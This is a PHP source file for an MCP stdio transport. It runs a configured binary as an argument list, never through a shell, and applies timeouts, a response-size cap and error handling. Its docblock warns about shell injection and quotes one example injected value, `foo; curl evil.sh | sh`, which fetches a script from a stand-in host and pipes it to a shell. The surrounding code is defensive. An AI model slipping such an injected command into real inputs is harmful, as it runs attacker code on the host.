<?php

declare(strict_types=1);

namespace Pandora\Mcp\Transport;

use Pandora\Exceptions\McpDenied;
use Pandora\Mcp\McpServer;
use Symfony\Component\Process\Exception\ProcessTimedOutException;
use Symfony\Component\Process\Process;

/**
 * MCP over a local process.
 *
 * This class executes a binary named by a database row, which is why
 * `TransportFactory` refuses to construct it unless a deployment has
 * explicitly enabled the transport. The check is deliberately NOT in here: a
 * class that spawns processes guarded by its own early return is one
 * refactor away from spawning them, and the guard belongs where the decision
 * to build the object is made (ADR-0014).
 *
 * The command is passed as an argument list and never through a shell. A
 * single command string would be split by a shell that also honours `;`,
 * `&&`, backticks and globs — so a row containing `foo; curl evil.sh | sh`
 * would be two commands, and the second one is the interesting one.
 */
final readonly class StdioTransport implements McpTransportContract
{
    public function listTools(McpServer $server): array
    {
        $result = $this->rpc($server, 'tools/list', []);

        /** @var list<array<string, mixed>> $tools */
        $tools = array_values(array_filter(
            (array) ($result['tools'] ?? []),
            static fn (mixed $tool): bool => is_array($tool),
        ));

        return $tools;
    }

    public function callTool(McpServer $server, string $remoteName, array $arguments): array
    {
        return $this->rpc($server, 'tools/call', [
            'name' => $remoteName,
            'arguments' => $arguments === [] ? new \stdClass : $arguments,
        ]);
    }

    /**
     * @param array<string, mixed> $params
     * @return array<string, mixed>
     *
     * @throws McpDenied
     */
    private function rpc(McpServer $server, string $method, array $params): array
    {
        $command = (string) $server->command;

        if ($command === '') {
            throw McpDenied::serverUnavailable($server->slug, 'no command configured');
        }

        /** @var list<string> $arguments */
        $arguments = $server->command_arguments ?? [];

        // An argument LIST, never a shell string. `Process` with an array
        // execs directly, so nothing in these values is interpreted as a
        // separator, a pipe or a glob.
        $process = new Process([$command, ...$arguments]);
        $process->setTimeout((float) max(1, $server->timeout_seconds));
        $process->setInput(json_encode([
            'jsonrpc' => '2.0',
            'id' => bin2hex(random_bytes(8)),
            'method' => $method,
            'params' => $params,
        ], JSON_THROW_ON_ERROR)."\n");

        try {
            $process->run();
        } catch (ProcessTimedOutException $e) {
            throw McpDenied::serverUnavailable($server->slug, 'timed out');
        } catch (\Throwable $e) {
            throw McpDenied::serverUnavailable($server->slug, $e->getMessage());
        }

        if (! $process->isSuccessful()) {
            throw McpDenied::serverUnavailable(
                $server->slug,
                mb_substr(trim($process->getErrorOutput()), 0, 200),
            );
        }

        $output = $process->getOutput();
        $maxBytes = (int) config('pandora.mcp.client.max_response_bytes', 262144);

        if (strlen($output) > $maxBytes) {
            throw McpDenied::responseTooLarge($server->slug, $maxBytes);
        }

        try {
            /** @var array<string, mixed> $decoded */
            $decoded = json_decode(trim($output), true, 64, JSON_THROW_ON_ERROR);
        } catch (\JsonException $e) {
            throw McpDenied::callFailed($server->slug, 'malformed response: '.$e->getMessage());
        }

        if (isset($decoded['error'])) {
            /** @var array<string, mixed> $error */
            $error = (array) $decoded['error'];

            throw McpDenied::callFailed(
                $server->slug,
                mb_substr((string) ($error['message'] ?? 'unknown error'), 0, 200),
            );
        }

        /** @var array<string, mixed> $result */
        $result = (array) ($decoded['result'] ?? []);

        return $result;
    }
}
